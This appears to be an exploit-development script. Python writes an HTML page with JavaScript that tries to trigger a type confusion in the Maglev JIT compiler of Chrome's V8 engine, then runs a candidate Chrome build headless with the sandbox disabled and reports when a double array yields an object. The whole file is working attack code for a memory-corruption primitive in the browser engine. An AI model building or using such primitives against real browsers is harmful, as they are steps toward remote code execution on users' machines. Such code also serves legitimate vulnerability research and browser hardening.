import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let lines = [];
lines.push("function testC(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push("  arr[0] = obj;");
lines.push("  let r = 0;");
lines.push("  while (r < 1) {");
lines.push("    r = arr[1];");
lines.push("    break;");
lines.push("  }");
lines.push("  return r;");
lines.push("}");
lines.push("return testC;");

let fn = new Function(lines.join("\\n"))();
let dummy = { a: 1 };

console.log("1. Recording transition in IC...");
for (let i = 0; i < 10; i++) {
  let a = [1.1, 2.2, 3.3];
  fn(1000, a, dummy);
}

console.log("2. Warming up invocation count...");
let stable = [dummy, 2.2, 3.3];
for (let i = 0; i < 20000; i++) {
  fn(i, stable, dummy);
}

console.log("3. Waiting for Maglev compilation...");
for (let attempt = 0; attempt < 50; attempt++) {
  let t0 = Date.now();
  while (Date.now() - t0 < 30); // 30ms sleep
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1000, farr, dummy);
  if (typeof res === "object") {
    console.log(`=== SINKHOLE SUCCESS! Attempt ${attempt}: Type: object! Object:`, res, "===");
    break;
  }
  if (attempt === 0 || attempt % 15 === 0) {
    console.log(`Attempt ${attempt}: res is ${typeof res} ${res}`);
  }
}
</script></body></html>"""

with open("script/test_sink_primitive.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/test_sink_primitive.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=8)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if "testC" in line or "CONSOLE" in line or "SUCCESS" in line:
        print(line)
